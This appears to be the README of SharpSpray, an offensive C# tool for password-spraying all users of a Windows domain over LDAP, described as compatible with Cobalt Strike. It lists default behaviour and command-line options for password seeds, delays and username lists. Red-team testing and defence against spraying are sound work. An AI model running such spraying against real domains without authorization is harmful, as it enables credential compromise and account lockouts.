# SharpSpray
This project is a C# port of my PowerSpray.ps1 script. SharpSpray a simple code set to perform a password spraying attack against all users of a domain using LDAP and is compatible with Cobalt Strike.

https://github.com/jnqpblc/Misc-PowerShell/blob/master/PowerSpray.ps1

By default it will automatically generate the UserList from the domain.

By default it will automatically generate the PasswordList using the current date.

Be careful not to lockout any accounts.

```
SharpSpray.exe
      --Seeds [ A comma-separated list of passwords to as a seed to the internal list generator. Eg. Password,Welcome,Company ]
      --Passwords [ A comma-separated list of passwords to use instead of the internal list generator. Eg. Password1,Password19,Company19,Welcome19 ]
      --Delay [ The delay time between guesses in millisecounds. Eg. 300 ]
      --Sleep [ The number of minutes to sleep between password cycles. Eg. 15 ]
      --Usernames [ A comma-seperated list of usernames to use instead of the automated collection of usernames ]
